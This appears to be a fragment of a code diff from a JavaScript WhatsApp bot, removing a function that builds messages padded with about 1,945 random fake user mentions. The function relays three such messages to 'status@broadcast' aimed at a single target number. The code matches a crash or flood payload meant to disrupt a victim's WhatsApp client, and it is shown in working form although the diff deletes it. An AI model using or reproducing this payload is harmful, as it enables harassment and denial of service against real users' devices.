-          fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
-          directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
-          mediaKeyTimestamp: "1743848703",
-          contextInfo: {
-            isSampled: true,
-            mentionedJid: [
-              "13135550002@s.whatsapp.net",
-              ...Array.from({ length: 1945 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
-            ]
-          },
-          forwardedNewsletterMessageInfo: {
-            newsletterJid: "120363321780343299@newsletter",
-            serverMessageId: 1,
-            newsletterName: ""
-          },
-          streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
-          thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
-          thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
-          thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k="
-        }
-      }
-    }
-  };
-
-  await sock.relayMessage("status@broadcast", ArT1, {
-    statusJidList: [target],
-    additional: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              {
-                tag: "to",
-                attrs: { jid: target },
-                content: undefined
-              }
-            ]
-          }
-        ]
-      }
-    ]
-  });
-
-  await sock.relayMessage("status@broadcast", ArT2, {
-    statusJidList: [target],
-    additional: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              {
-                tag: "to",
-                attrs: { jid: target },
-                content: undefined
-              }
-            ]
-          }
-        ]
-      }
-    ]
-  });
-
-  await sock.relayMessage("status@broadcast", ArT3, {
-    statusJidList: [target],
-    additional: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              {
-                tag: "to",
-                attrs: { jid: target },
-                content: undefined
-              }
-            ]
-          }
-        ]
-      }
-    ]
-  });
-}
-
 
 // --- Jalankan Bot --- //
 (async () => {
